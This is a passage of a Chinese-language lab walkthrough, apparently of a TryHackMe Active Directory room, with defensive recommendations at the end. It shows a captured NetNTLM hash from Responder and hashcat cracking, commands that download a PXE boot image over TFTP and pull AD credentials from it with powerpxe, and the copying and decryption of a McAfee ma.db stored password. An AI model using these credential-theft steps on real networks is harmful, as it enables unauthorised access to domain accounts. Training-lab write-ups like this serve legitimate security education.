<p>然而，在某些情况下，我们可以更进一步，尝试传递挑战，而不是直接捕获挑战。如果事先不了解帐户，则执行此操作会有点困难，因为此攻击取决于关联帐户的权限。我们需要做一些对我们有利的事情：</p>
<ul>
<li>应禁用或启用 SMB 签名，但不强制执行。当我们执行中继时，我们会对请求进行微小的更改以将其传递。如果启用了 SMB 签名，我们将无法伪造消息签名，这意味着服务器会拒绝它。</li>
<li>关联的帐户需要服务器上的相关权限才能访问所请求的资源。理想情况下，我们希望中继具有服务器管理权限的帐户的质询和响应，因为这将使我们能够在主机上立足。</li>
<li>由于我们在技术上还没有 AD 立足点，因此需要对哪些帐户对哪些主机拥有权限进行一些猜测。如果我们已经违反了 AD，我们可以先执行一些初始枚举，这通常是这种情况。</li>
</ul>
<p>这就是盲接通常不流行的原因。理想情况下，您首先使用另一种方法破坏 AD，然后执行枚举以确定与您所破坏的帐户关联的权限。从这里，您通常可以执行横向移动以跨域进行权限升级。不过，从根本上了解一下中继攻击的工作原理还是很好的，如下图所示：</p>
<p class='item-img' data-src='https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png'><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png" alt="img"></p>
<p>如果您想实际尝试这种类型的攻击，请前往 Holo Network。我们也会在以后的广告室中再次讨论这一点。</p>
<p>首先执行responder：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175553243.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175553243.png" alt="image-20240209175553243"></p>
<p>十分钟左右得到如下响应：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175607624.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175607624.png" alt="image-20240209175607624"></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">svcFileCopy::ZA:b74c5cc6e5eaac51:E3C2C14AD0C8767E33B65AF91E87ABFE:<span class="hljs-number">0101000000000000803</span>D5A817F5BDA01051BE47B70F1B4730000000002000800380059005500440001001E00570049004E002D00340055005500560035004C0036004E0046003800300004003400570049004E002D00340055005500560035004C0036004E004600380030002E0038005900550044002E004C004F00430041004C000300140038005900550044002E004C004F00430041004C000500140038005900550044002E004C004F00430041004C0007000800803D5A817F5BDA0106000400020000000800300030000000000000000000000000200000B439D5FE6702315673E604C277083A3E0C091CE1C8C49BBD1E05AB2FCAA4BD990A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E0038002E00310030000000000000000000<br></code></pre></td></tr></table></figure>
<p>赋值其中的hash值到文件中，接着hashcat进行破解</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175641033.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175641033.png" alt="image-20240209175641033"></p>
<p>一分钟左右得到结果：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175657254.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175657254.png" alt="image-20240209175657254"></p>
<p>箭头处为密码</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175711468.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209175711468.png" alt="image-20240209175711468"></p>
<h1>0x06 Microsoft 部署工具包</h1>
<p>大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。幸运的是，微软已经提供了管理资产所需的工具。然而，我们也可以利用这些工具中的错误配置来破坏 AD。</p>
<h2 id="MDT-and-SCCM"><a href="#MDT-and-SCCM" class="headerlink" title="MDT-and-SCCM"></a>MDT and SCCM</h2>
<p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p>
<p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。它还可以确保在安装第一次运行时更新新版本。</p>
<p>SCCM 几乎可以被视为 MDT 的扩展和老大哥。软件安装后会发生什么？嗯，SCCM 进行这种类型的补丁管理。它允许 IT 团队查看整个地产中安装的所有软件的可用更新。团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 团队的工作变得更加轻松。</p>
<p>然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。</p>
<h2 id="PXE-Boot"><a href="#PXE-Boot" class="headerlink" title="PXE-Boot"></a>PXE Boot</h2>
<p>大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180403270.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180403270.png" alt="image-20240209180403270"></p>
<p>执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：</p>
<ul>
<li>注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。</li>
<li>执行密码抓取攻击以恢复安装期间使用的 AD 凭据。</li>
</ul>
<p>在本任务中，我们将重点关注后者。我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。</p>
<h2 id="PXE-Boot-Image-Retrieval"><a href="#PXE-Boot-Image-Retrieval" class="headerlink" title="PXE-Boot-Image-Retrieval"></a>PXE Boot Image Retrieval</h2>
<p>由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行该过程中此步骤的其余攻击。</p>
<p>您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p>
<p>您收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。要检索此信息，您需要连接到此网站：<a target="_blank" rel="noopener" href="http://pxeboot.za.tryhackme.com">http://pxeboot.za.tryhackme.com</a>。它将列出各种 BCD 文件：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180621620.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209180621620.png" alt="image-20240209180621620"></p>
<p>通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。不过，由于时间关系，我们将重点关注 x64 架构的 BCD 文件。复制并存储该文件的全名。在本练习的其余部分中，我们将使用此名称占位符 <code>x64&#123;7B...B3&#125;.bcd</code> ，因为 MDT 每天都会重新生成文件及其名称。每次看到此占位符时，请记住将其替换为您的特定 BCD 文件名。另请注意，如果网络刚刚启动，这些文件名将仅在网络处于活动状态 10 分钟后更新。</p>
<p>现在从 DHCP 恢复了初始信息（眨眼），我们可以枚举并检索 PXE 启动映像。在接下来的几个步骤中，我们将使用 THMJMP1 上的 SSH 连接，因此请使用以下命令对此 SSH 会话进行身份验证：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh thm<span class="hljs-keyword">@THMJMP</span>1.za.tryhackme.com<br></code></pre></td></tr></table></figure>
<p>以及 <code>Password1@</code> 的密码。</p>
<p>为了确保网络的所有用户都可以使用 SSH，首先使用您的用户名创建一个文件夹，并将 powerpxe 存储库复制到此文件夹中：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\Users\THM&gt;cd Documents<br>C:\Users\THM\Documents&gt; mkdir hybcx<br>C:\Users\THM\Documents&gt; copy C:\powerpxe hybcx\<br>C:\Users\THM\Documents\&gt; cd hybcx<br></code></pre></td></tr></table></figure>
<p>我们需要执行的第一步是使用 TFTP 并下载 BCD 文件来读取 MDT 服务器的配置。 TFTP 比 FTP 有点棘手，因为我们无法列出文件。相反，我们发送文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，我们在指定文件和文件路径时需要准确。 BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">tftp -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.200</span><span class="hljs-selector-class">.9</span><span class="hljs-selector-class">.202</span> GET &quot;\Tmp\x64&#123;E212701C-<span class="hljs-number">9</span>A00-<span class="hljs-number">4</span>A53-<span class="hljs-number">866</span>C-F5DDD6C087D9&#125;<span class="hljs-selector-class">.bcd</span>&quot; conf<span class="hljs-selector-class">.bcd</span><br></code></pre></td></tr></table></figure>
<p>您必须使用 <code>nslookup thmmdt.za.tryhackme.com</code> 查找 THMMDT IP。现在 BCD 文件已恢复，我们将使用 powerpxe 读取其内容。 Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但通常会产生不同的结果，因此最好执行手动方法。我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182212001.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182212001.png" alt="image-20240209182212001"></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">powershell -executionpolicy bypass<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182254135.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209182254135.png" alt></p>
<p>WIM 文件是 Windows 映像格式 (WIM) 的可启动映像。现在我们已经知道了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载该映像：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">tftp -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.200</span><span class="hljs-selector-class">.9</span><span class="hljs-selector-class">.202</span> GET &quot;\Boot\x64\Images\LiteTouchPE_x64<span class="hljs-selector-class">.wim</span>&quot; pxeboot<span class="hljs-selector-class">.wim</span><br></code></pre></td></tr></table></figure>
<p>由于您正在下载完全可启动且已配置的 Windows 映像，因此此下载将需要一段时间。也许在等待的时候伸伸腿，喝杯水。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183036761.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183036761.png" alt="image-20240209183036761"></p>
<h2 id="从-PXE-启动映像恢复凭证"><a href="#从-PXE-启动映像恢复凭证" class="headerlink" title="从-PXE-启动映像恢复凭证"></a>从 PXE 启动映像恢复凭证</h2>
<p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。应该指出的是，我们可以发起各种攻击。我们可以注入本地管理员用户，因此一旦映像启动，我们就具有管理员访问权限，我们可以安装映像以拥有加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读本文。本次练习将重点关注尝试窃取凭据的简单攻击。</p>
<p>我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。要使用 powerpxe 从引导文件恢复凭据，请运行以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Get-FindCredentials -WimFile pxeboot<span class="hljs-selector-class">.wim</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183140705.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183140705.png" alt="image-20240209183140705"></p>
<p>如您所见，powerpxe 能够恢复 AD 凭据。我们现在有了另一组可以使用的 AD 凭据！</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183850316.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209183850316.png" alt="image-20240209183850316"></p>
<h1>0x07 配置文件</h1>
<p>我们将在此网络中探索的最后一个枚举途径是配置文件。假设您足够幸运，造成了一次漏洞，使您能够访问组织网络上的主机。在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳探索途径。根据被破坏的主机，各种配置文件可能具有枚举价值：</p>
<ul>
<li>Web 应用程序配置文件</li>
<li>服务配置文件</li>
<li>Registry keys 注册表项</li>
<li>集中部署的应用程序</li>
</ul>
<p>可以使用多个枚举脚本（例如 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>）来自动执行此过程。</p>
<h2 id="配置文件凭证"><a href="#配置文件凭证" class="headerlink" title="配置文件凭证"></a>配置文件凭证</h2>
<p>但是，在此任务中，我们将重点关注从集中部署的应用程序恢复凭据。通常，这些应用程序需要一种在安装和执行阶段对域进行身份验证的方法。此类应用程序的一个示例是 McAfee Enterprise Endpoint Security，组织可以将其用作端点检测和安全响应工具。</p>
<p>McAfee 将安装期间用于连接回 Orchestrator 的凭据嵌入名为 ma.db 的文件中。可以通过对主机的本地访问来检索和读取该数据库文件，以恢复关联的 AD 服务帐户。在本练习中，我们将再次使用 THMJMP1 上的 SSH 访问。</p>
<p>ma.db 文件存储在固定位置：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184228541.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184228541.png" alt="image-20240209184228541"></p>
<p>我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">scp thm<span class="hljs-keyword">@THMJMP</span>1.za.tryhackme.<span class="hljs-attribute">com</span>:<span class="hljs-attribute">C</span>:/ProgramData/McAfee/Agent/DB/ma.db .<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184454655.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184454655.png" alt="image-20240209184454655"></p>
<p>为了读取数据库文件，我们将使用一个名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">sqlitebrowser ma<span class="hljs-selector-class">.db</span><br></code></pre></td></tr></table></figure>
<p>使用 sqlitebrowser，我们将选择“浏览数据”选项并关注 AGENT_REPOSITORIES 表：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184603539.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209184603539.png" alt="image-20240209184603539"></p>
<p>我们对第二个条目特别感兴趣，重点是 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。记下这些条目中存储的值。但是，AUTH_PASSWD 字段已加密。幸运的是，McAfee 使用已知密钥加密该字段。因此，我们将使用以下旧的 python2 脚本来解密密码。该脚本已作为可下载的任务文件或在 AttackBox 上提供，可以在 <code>/root/Rooms/BreachingAD/task7/</code> 目录中找到。</p>
<p><strong>注意：我们在这里使用的工具已经很旧了。它使用 Python v2 并依赖于旧的加密库。如果您无法让脚本在您自己的虚拟机上运行，​​请使用 AttackBox。不过，该应用程序最近进行了更新，以确保它也可以在 Python3 上运行，您可以在此处下载最新版本：<a target="_blank" rel="noopener" href="https://github.com/funoverip/mcafee-sitelist-pwd-decryption">https://github.com/funoverip/mcafee-sitelist-pwd-decryption</a></strong></p>
<p>您必须解压缩 mcafee-sitelist-pwd-decryption.zip 文件，通过向脚本提供我们的 base64 编码和加密密码，该脚本将提供解密的密码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">python3 mcafee_sitelist_pwd_decrypt<span class="hljs-selector-class">.py</span> jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185538219.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185538219.png" alt="image-20240209185538219"></p>
<p>现在，我们再次拥有了一组 AD 凭据，可用于进一步枚举！这只是从配置文件恢复凭据的示例之一。如果您能够在主机上站稳脚跟，请务必遵循详细而完善的方法，以确保从主机恢复所有战利品，包括凭证和其他可以存储在配置文件中的敏感信息。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185831855.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240209185831855.png" alt="image-20240209185831855"></p>
<h1>0x08 总结</h1>
<p>可以通过大量的攻击途径来破坏 AD。我们介绍了该网络中红队演习期间常用的一些常用方法。由于攻击面的巨大，人们不断发现恢复第一组 AD 凭据的新途径。需要建立适当的枚举方法并不断更新它才能找到初始凭证对。</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2>
<p>在防御措施方面，组织可以采取一些步骤：</p>
<ul>
<li>用户意识和培训 - 网络安全链中最薄弱的环节几乎总是用户。对用户进行培训，让他们意识到在泄露凭证等敏感信息时应小心谨慎，并且不要信任可疑电子邮件，从而减少这种攻击面。</li>
<li>限制在线 AD 服务和应用程序的暴露 - 并非所有应用程序都必须可通过 Internet 访问，尤其是那些支持 NTLM 和 LDAP 身份验证的应用程序。相反，这些应用程序应放置在可通过 VPN 访问的 Intranet 中。然后，VPN 可以支持多重身份验证以增强安全性。</li>
<li>实施网络访问控制 (NAC) - NAC 可以防止攻击者连接网络上的恶意设备。然而，这将需要相当多的努力，因为合法设备必须被列入白名单。</li>
<li>强制执行 SMB 签名 - 通过强制执行 SMB 签名，不可能进行 SMB 中继攻击。</li>
<li>遵循最小权限原则 - 在大多数情况下，攻击者将能够恢复一组 AD 凭据。通过遵循最小特权原则，特别是对于用于服务的凭证，可以显着降低与这些凭证被泄露相关的风险。</li>
</ul>
<p>现在我们已经突破了 AD，下一步是执行 AD 的枚举，以更好地理解域结构并识别可被利用的潜在错误配置。这将在下一个房间中介绍。记得清除DNS配置！</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/10/THM-Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">← Next THM-Linux权限提升</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/08/THM-RootMe/">THM-RootMe Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Breaching-Active-Directory"><span class="toc-number">1.1.</span> <span class="toc-text">Breaching Active Directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning-Objectives"><span class="toc-number">1.2.</span> <span class="toc-text">Learning Objectives</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 OSINT 和网络钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OSINT-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5"><span class="toc-number">2.1.</span> <span class="toc-text">OSINT 开源情报</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phishing"><span class="toc-number">2.2.</span> <span class="toc-text">Phishing</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 NTLM 验证服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-and-NetNTLM"><span class="toc-number">3.1.</span> <span class="toc-text">NTLM and NetNTLM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%99%BB%E5%BD%95%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">暴力登录攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 LDAP 绑定凭证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP"><span class="toc-number">4.1.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-%E5%9B%9E%E4%BC%A0%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">LDAP 回传攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-LDAP-%E5%9B%9E%E4%BC%A0"><span class="toc-number">4.3.</span> <span class="toc-text">执行 LDAP 回传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F-LDAP-%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">4.4.</span> <span class="toc-text">托管恶意 LDAP 服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8D%95%E8%8E%B7-LDAP-%E5%87%AD%E8%AF%81"><span class="toc-number">4.5.</span> <span class="toc-text">捕获 LDAP 凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 身份验证中继</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B6%88%E6%81%AF%E5%9D%97"><span class="toc-number">5.1.</span> <span class="toc-text">服务器消息块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LLMNR-NBT-NS-and-WPAD"><span class="toc-number">5.2.</span> <span class="toc-text">LLMNR, NBT-NS, and WPAD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%A6%E6%88%AA-NetNTLM-%E6%8C%91%E6%88%98"><span class="toc-number">5.3.</span> <span class="toc-text">拦截 NetNTLM 挑战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">NTLM 密码喷射攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E6%8C%91%E6%88%98"><span class="toc-number">5.5.</span> <span class="toc-text">传递挑战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 Microsoft 部署工具包</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MDT-and-SCCM"><span class="toc-number">6.1.</span> <span class="toc-text">MDT and SCCM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PXE-Boot"><span class="toc-number">6.2.</span> <span class="toc-text">PXE Boot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PXE-Boot-Image-Retrieval"><span class="toc-number">6.3.</span> <span class="toc-text">PXE Boot Image Retrieval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-PXE-%E5%90%AF%E5%8A%A8%E6%98%A0%E5%83%8F%E6%81%A2%E5%A4%8D%E5%87%AD%E8%AF%81"><span class="toc-number">6.4.</span> <span class="toc-text">从 PXE 启动映像恢复凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%87%AD%E8%AF%81"><span class="toc-number">7.1.</span> <span class="toc-text">配置文件凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">8.1.</span> <span class="toc-text">防御措施</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>